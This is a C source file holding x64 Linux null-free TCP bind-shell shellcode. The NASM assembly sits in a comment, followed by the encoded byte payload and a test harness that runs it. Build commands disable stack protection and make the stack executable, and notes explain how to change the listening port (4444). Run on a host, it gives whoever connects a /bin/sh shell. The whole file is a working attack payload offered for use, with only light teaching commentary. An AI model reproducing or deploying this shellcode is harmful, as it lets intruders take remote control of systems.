/*---------------------------------------------------------------------------------------------------------------------
 * /*
* Author:           Scorpion
* Copyright:        (c) 2016 iQube. (http://iQube.io)
* Release Date:     January 1, 2016
*
* Description:      x64 Linux null-free TCP bind port shellcode
* Assembled Size:   103 bytes
* Tested On:        Ubuntu 14.04 LTS
*
* Build/Run:        gcc -fno-stack-protector -z execstack bindshell.c -o bindshell
*                   ./bindshell
*                   nc localhost 4444
*
*/

/*
* NOTE: This C code binds on port 4444
* The end of this file contains the .nasm source code
* The Port can be Reconfigured According to your needs
* Instructions for changing port number
* Port obtainer change the port value accorddingly
*  					port.py
*          				import socket
*		   				port = 444
*          				hex(socket.htons(port))
*  					python port.py
*  					Result : 0x5c11
* Replace the obtained value in the shellcode to change the port number
* For building the from .nasm source use
* 					nasm -felf64 filename.nasm -o filename.o
* 					ld filename.o -o filename
* To inspect for nulls
* 					objdump -M intel -D filename.o


global _start

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41

	xor rax, rax    ;Xor function will null the values in the register beacuse we doesn't know whats the value in the register in realtime cases
	xor rsi, rsi
	mul rsi
	push byte 0x2   ;pusing argument to the stack
	pop rdi         ; poping the argument to the rdi instructions on the top of the stack should be remove first because stack LIFO
	inc esi         ; already rsi is 0 so incrementing the rsi register will make it 1
	push byte 0x29  ; pushing the syscall number into the rax by using stack
	pop rax
	syscall

	; copying the socket descripter from rax to rdi register so that we can use it further

	xchg rax, rdi

	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)
	; setting up the data sctructure

	push 0x2			             ;AF_INET value is 2 so we are pushing 0x2
    mov word [rsp + 2],0x5c11        ;port 4444 htons hex value is 0x5c11 port values can be be obtained by following above instructions
    push rsp                         ; saving the complete argument to rsi register
    pop rsi


	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	push rdx          				; Inserting the null to the stack
	push byte 0x10
	pop rdx							; value of the rdx register is set to 16 size sockaddr
	push byte 0x31
	pop rax							; rax register is set with 49 syscall for bind
	syscall

	;listen the sockets for the incomming connections
	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	pop rsi
	push 0x32
	pop rax                          ; rax register is set to 50 syscall for listen
	syscall

	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
 	;syscall number 43

 	push 0x2b
	pop rax                           ; rax register is set to 43 syscall for accept
 	syscall

 	; storing the client socket description
	mov r9, rax

	; close parent
	push 0x3
	pop rax                            ; closing the parent socket connection using close parent rax is set to 3 syscall to close parent
	syscall

	xchg rdi , r9
	xor rsi , rsi

	; initilization of dup2
	push 0x3
	pop rsi								; setting argument to 3



duplicate:
    dec esi
    mov al, 0x21                       ;duplicate syscall applied to error,output and input using loop
    syscall
    jne duplicate


execve:                                      ; Execve format  , execve("/bin/sh", 0 , 0)
     xor rsi , rsi
     mul rsi                                 ; zeroed rax , rdx register
     push ax                                 ; terminate string with null
     mov rbx , 0x68732f2f6e69622f            ; "/bin//sh"  in reverse order
     push rbx
     push rsp
     pop rdi                                 ; set RDI
     push byte 0x3b                          ; execve syscall number (59)
     pop rax
     syscall


*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xc0\x48\x31\xf6\x48\xf7\xe6\x6a\x02\x5f\xff\xc6\x6a\x29\x58\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02"
//Port number this value can be obtained from the above instructions
"\x11\x5c"
"\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x49\x89\xc1\x6a\x03\x58\x0f\x05\x49\x87\xf9\x48\x31\xf6\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x31\xf6\x48\xf7\xe6\x66\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05";



main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

